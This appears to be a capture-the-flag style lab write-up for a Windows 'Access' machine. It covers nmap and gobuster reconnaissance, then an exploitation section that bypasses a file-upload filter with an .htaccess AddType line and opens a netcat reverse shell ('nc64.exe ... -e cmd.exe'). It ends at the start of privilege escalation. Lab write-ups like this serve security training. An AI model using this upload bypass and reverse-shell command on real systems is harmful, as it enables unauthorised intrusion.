# Access Lab
## Reconnaissance
### All port scanning
#### TCP Ports
- `nmap -p- -T4 -sS -min-rate 1000 192.168.225.187`<br>![Scan](/1.Access//images/All_port_scan.png)
- `nmap -A -p 53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001 192.168.225.187`

    ```
    Service scan Timing: About 18.75% done; ETC: 12:48 (0:00:30 remaining)
    Nmap scan report for 192.168.225.187
    Host is up (0.11s latency).

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain        Simple DNS Plus
    80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
    |_http-title: Access The Event
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-12 07:17:58Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn?
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
    443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
    | tls-alpn: 
    |_  http/1.1
    |_ssl-date: TLS randomness does not represent time
    |_http-title: Access The Event
    |_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
    | http-methods: 
    |_  Potentially risky methods: TRACE
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  adws?
    47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port139-TCP:V=7.99%I=7%D=7/12%Time=6A533FA4%P=x86_64-pc-linux-gnu%r(Get
    SF:Request,5,"\x83\0\0\x01\x8f");
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running (JUST GUESSING): Microsoft Windows 2019|10|11|2012|2022|2016 (95%)
    OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2016
    Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1909 - 2004 (94%), Microsoft Windows 10 1709 - 22H2 (92%), Microsoft Windows 10 1909 (90%), Microsoft Windows 11 24H2 - 25H2 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2016 (88%), Microsoft Windows 10 20H2 (87%), Microsoft Windows Server 2012 Data Center (87%)
    No exact OS matches for host (test conditions non-ideal).
    Network Distance: 4 hops
    Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-time: 
    |   date: 2026-07-12T07:18:19
    |_  start_date: N/A
    | smb2-security-mode: 
    |   3.1.1: 
    |_    Message signing enabled and required

    TRACEROUTE (using port 443/tcp)
    HOP RTT       ADDRESS
    1   109.78 ms 192.168.45.1
    2   109.75 ms 192.168.45.254
    3   109.78 ms 192.168.251.1
    4   109.79 ms 192.168.225.187
    ```
    > as **http** is open and is showing php there could be some way to exploit it and gain shell also the server is running on windows.
#### UDP Ports
- `nmap -sU -A --top-ports 20 192.168.225.187`<br>![Scan](/1.Access/images/All_port_scan.png)

### Web Scanning
> we will first visit the website via `https://192.168.225.187/` and look for some impotant details.

![Webpage](/1.Access//images/web_page.png)
![Domainname](/images/web_page_domain_name.png)<br>
- We have found the domain name for the webpage let's do the hostname resolution in `/etc/hosts` file.
- Now, we can get access to website with url - `http://example.com/`
- Buy ticket feature in the website can give us file upload vulnerability ![File_upload](/1.Access//images/file_upload.png)
- By viewing page source we have also found the theme which was used to make this website so by follwoing this link we can also download the theme and understand it's file structure ![file_structure](/1.Access//images/Themes.png)
#### Sub-directory enumeration
- `gobuster dir -u http://192.168.225.187 -w /usr/share/wordlists/dirb/common.txt`

    ```
    ===============================================================
    Gobuster v3.8.2
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://192.168.225.187
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirb/common.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.8.2
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    .hta                 (Status: 403) [Size: 304]
    .htaccess            (Status: 403) [Size: 304]
    .htpasswd            (Status: 403) [Size: 304]
    assets               (Status: 301) [Size: 343] [--> http://192.168.225.187/assets/]
    aux                  (Status: 403) [Size: 304]
    cgi-bin/             (Status: 403) [Size: 304]
    com3                 (Status: 403) [Size: 304]
    com1                 (Status: 403) [Size: 304]
    com2                 (Status: 403) [Size: 304]
    con                  (Status: 403) [Size: 304]
    examples             (Status: 503) [Size: 404]
    forms                (Status: 301) [Size: 342] [--> http://192.168.225.187/forms/]
    index.html           (Status: 200) [Size: 49680]
    licenses             (Status: 403) [Size: 423]
    lpt2                 (Status: 403) [Size: 304]
    lpt1                 (Status: 403) [Size: 304]
    nul                  (Status: 403) [Size: 304]
    phpmyadmin           (Status: 403) [Size: 423]
    prn                  (Status: 403) [Size: 304]
    server-status        (Status: 403) [Size: 423]
    server-info          (Status: 403) [Size: 423]
    uploads              (Status: 301) [Size: 344] [--> http://192.168.225.187/uploads/]
    webalizer            (Status: 403) [Size: 423]
    Progress: 4376 / 4613 (94.86%)[ERROR] error on word Utilities: timeout occurred during the request
    [ERROR] error on word utility: timeout occurred during the request
    Progress: 4613 / 4613 (100.00%)
    ===============================================================
    Finished
    ===============================================================
    ```
#### Sub-Domain enumeration
- this did'nt workout as there were no subdomins within `example.com`

## Exploitation
### File upload vulnerability
- We will use file upload vulnerability using buy tickets file upload vector, and upload php reverseshell payload. [**Php_reverse_shell**](/OSCP-LABS/1.Access/www_webshell.php)
- But this type of file is not allowed for uploading into website.![not_allowed](/OSCP-LABS/1.Access/images/not_allowed.png)
- So, we will try to upload `.htaccess` file to change the servers configuration such that it will read `.` files as `PHP`. As, Apache files uses `.htaccess`
- We will use this payload inside .htaccess file `AddType application/x-httpd-php .evil` and rename the reverse shell payload to `www_webshell.evil`.
- Upload Both files to website using Buy Tickets.
- Browse to the `/uploads` and upload `nc64.exe` (or fetch it via python http-server) and then write the command `nc64.exe <tun_0_ip> <port> -e cmd.exe`
- Open terminal and turn on netcat listner `nc -nlvp <port>`
- Reverse Shell got.
### Privelage Escalation

```pwsh
PS C:\xampp\htdocs\uploads> net users
net users

User accounts for \\SERVER

-------------------------------------------------------------------------------
Administrator            Guest                    krbtgt                   
svc_apache               svc_mssql                
The command completed successfully.
```


